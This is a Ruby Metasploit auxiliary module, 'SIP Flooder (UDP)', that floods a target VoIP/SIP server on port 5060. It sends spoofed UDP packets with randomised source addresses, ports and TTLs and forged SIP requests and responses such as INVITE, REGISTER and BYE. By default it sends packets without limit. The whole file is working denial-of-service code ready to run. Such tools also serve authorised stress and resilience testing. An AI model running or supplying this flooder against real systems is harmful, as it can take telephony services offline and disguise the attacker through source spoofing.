require 'msf/core'


class Metasploit3 < Msf::Auxiliary

    include Msf::Auxiliary::Dos
    include Msf::Exploit::Capture

    def initialize
        super(
            'Name'			=>  'SIP Flooder (UDP)',
            'Version'		=>  '$Revision: 0 $',
            'Description'	=>  'A simple SIP Flooder (UDP), it supports most common types of packets',
            'Author'		=>  'Jesus Perez <jesus.perez[at]quobis.com>',
            'License'		=>  MSF_LICENSE
        )

        register_options(
        [
            Opt::RPORT(5060),
            OptAddress.new('SHOST', [false, 'The spoofable source address (else randomizes)']),
            OptInt.new('SPORT', [false, 'The source port (else randomizes)']),
            OptInt.new('NUM', [false, 'Number of packets to send (else unlimited)']),
            OptEnum.new('METHOD',  [true, 'Flood method', 'INVITE', ['OPTIONS', 'INVITE', 'REGISTER', 'ACK', 'OK', 'BYE', 'TRYING', 'RINGING']]),
        ],  self.class)

        deregister_options('FILTER','PCAPFILE','SNAPLEN')
    end

    def rport
        datastore['RPORT'].to_i
    end

    def lport
        datastore['SPORT'].to_i.zero? ? rand(65535)+1 : datastore['SPORT'].to_i
    end

    def srchost
        datastore['SHOST'] || [rand(0x100000000)].pack('N').unpack('C*').join('.')
    end

    def run
        sent = 0
        num = datastore['NUM']

        print_status("SIP flooding #{rhost}:#{rport}...")

        while (num <= 0) or (sent < num)
			open_pcap
			p = PacketFu::UDPPacket.new
			p.ip_daddr = rhost
			p.udp_dport = rport
            srchost_fix = srchost
            p.ip_saddr = srchost_fix
            p.ip_ttl = rand(128)+128
            p.udp_sport = lport
            testext = 100 + rand(899)
            to_ext = 100 + rand(899)
            data = create_probe(datastore['METHOD'], rhost, srchost_fix, testext, to_ext, 'UDP')
            p.payload = data
            p.recalc
            capture_sendto(p,rhost)
            sent += 1
            close_pcap
        end

    end

    # SIP requests creator
    def create_probe(meth, realm, shost, from_ext, to_ext, transport)
        from_tag = "%.8x" % rand(0x100000000)
        to_tag = "%.8x" % rand(0x100000000)
        branch_pad = "%.7x" % rand(0x10000000)
        #ext = rand(999)
        from_uri = "sip:#{from_ext}@#{realm}"
        target_uri = "sip:#{realm}"
        #cseq = rand(99999)
        cseq = 1

        call_id = 10000000000 + rand(89999999999)
        chain = "%.16x" % rand(0x10000000000000000)
        call_id_reg = "#{call_id}@#{chain}" 
        to_uri = "sip:#{to_ext}@#{realm}"
        session_id = 1000000000 + rand(8999999999)

        case meth
            when "REGISTER"
                data  = "#{meth} #{target_uri} SIP/2.0\r\n"
            when "OPTIONS", "INVITE", "ACK", "BYE"
                data  = "#{meth} #{to_uri} SIP/2.0\r\n"
            when "OK"
                data = "SIP/2.0 200 OK\r\n"
            when "TRYING"
                data = "SIP/2.0 100 Trying\r\n"
            when "RINGING"
                data = "SIP/2.0 180 Ringing\r\n"
        end
        data << "Via: SIP/2.0/#{transport} #{shost};branch=z9hG4bK#{branch_pad}\r\n"
        if (meth == "OK" or meth == "TRYING" or meth == "RINGING")
            data << " ;received = #{shost}\r\n"
        end
        if (meth == "REGISTER" or meth == "OPTIONS" or meth == "INVITE" or meth == "BYE" or meth == "ACK")
            data << "Max-Forwards: 70\r\n"
        end
        data << "From: #{from_ext} <#{from_uri}>;tag=#{from_tag}\r\n"
        case meth
            when "REGISTER"
                data << "To: #{from_ext} <#{from_uri}>\r\n"
            when "ACK", "BYE", "OK", "RINGING", "TRYING", "OPTIONS", "INVITE"
                data << "To: #{to_ext} <#{to_uri}>;tag=#{to_tag}\r\n"
        end
        case meth
            when "REGISTER"
				data << "Call-ID: #{call_id}@#{call_id_reg}\r\n"
            when "ACK", "BYE", "OK", "RINGING", "TRYING", "OPTIONS", "INVITE"
				data << "Call-ID: #{call_id}\r\n"
        end
        case meth
            when "REGISTER", "INVITE", "ACK", "BYE", "OPTIONS"
                data << "CSeq: #{cseq} #{meth}\r\n"
            when "OK", "TRYING", "RINGING"
                data << "CSeq: #{cseq} INVITE\r\n"
        end
        case meth
            when "REGISTER", "OPTIONS"
                data << "Contact: <#{from_uri}>\r\n"
            when "OK", "RINGING", "INVITE"
                data << "Contact: <#{to_uri};transport=#{transport.downcase}>\r\n"
        end
        if (meth == "OPTIONS")
            data << "Accept: application/sdp\r\n"
        end
        if (meth == "INVITE" or meth == "OK")
            data << "Content-Type: application/sdp\r\n"
            sdp = "v=0\r\n"
            sdp << "o=#{from_ext} #{session_id} #{session_id} IN IP4 #{shost}\r\n"
            sdp << "s=-\r\n"
            sdp << "c=IN IP4 #{shost}\r\n"
            sdp << "t=0 0\r\n"
            sdp << "m=audio 49172 RTP/AVP 0\r\n"
            sdp << "a=rtpmap:0 PCMU/8000\r\n"
        end
        case meth
            when "REGISTER", "OPTIONS", "ACK", "BYE", "TRYING", "RINGING"
                data << "Content-Length: 0\r\n"
            when "INVITE", "OK"
                data << "Content-Length: #{sdp.size}\r\n"
        end
        data << "\r\n"
        if (meth == "INVITE" or meth == "OK")
            data << sdp
        end

        return data
    end

end
